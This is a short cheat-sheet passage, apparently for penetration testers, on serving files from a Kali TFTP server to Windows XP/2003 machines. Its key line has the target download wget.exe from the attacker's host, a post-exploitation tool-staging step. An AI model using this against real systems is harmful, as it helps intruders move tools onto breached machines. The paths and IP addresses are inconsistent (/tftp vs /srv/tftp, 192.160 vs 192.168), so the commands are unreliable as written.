<h5>TFTP</h5>
<p>Windows XP and Windows 2003<br></p>
<pre>
#Kali TFTP setup

  atftpd --daemon --port 69 /tftp
  /etc/init.d/atftpd restart

#Now you can put stuff in /srv/tftp and it will be served. Remember that TFTP used UDP. So if you run netstat it will not show it as listening.
#You can see it running like this

  netstat -a -p UDP | grep udp

#So now you can upload and download whatever from the windows-machine like this

  tftp -i 192.160.1.101 GET wget.exe
#If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-interactive way.

  tftp 192.160.1.101
  GET test.txt
#I usually put all files I want to make available in /srv/tftp
#If you want to make sure that the file was uploaded correct you can check in the syslog. Grep for the IP like this:

  grep 192.168.1.101 /var/log/syslog
